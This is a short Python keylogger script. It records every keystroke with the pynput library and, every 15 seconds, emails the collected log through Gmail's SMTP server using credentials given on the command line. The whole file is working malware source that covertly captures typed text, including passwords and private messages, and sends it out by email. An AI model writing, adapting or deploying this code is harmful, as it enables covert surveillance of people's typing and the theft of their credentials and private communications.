import smtplib
import threading
from pynput import keyboard
from optparse import OptionParser

def user_inputs():
    options = OptionParser()
    options.add_option("-e","--e-mail",dest="email",help="Enter your real e-mail adress")
    options.add_option("-p","--password",dest="password",help="Enter your e-mail password")
    input = options.parse_args()[0]
    return input

log = ""

def call_func(keys):
    global log
    try:
        log += keys.char
    except:
        if keys == keys.space:
            log += " "
        else:
            log += str(keys)
    print(log)



def smtp(email,password):
    service = smtplib.SMTP("smtp.gmail.com",587)
    service.starttls()
    service.login(email,password)
    service.sendmail("hello@gmail.com",email,log.encode("utf-8")) # => encode yapmayı unutma
    service.quit()

def threading_send_meil():
    global log
    smtp(key.email,key.password)
    log = ""
    threading.Timer(15,threading_send_meil).start()

key = user_inputs()
get_key = keyboard.Listener(on_press=call_func)

threading_send_meil()
with get_key:
    get_key.join()
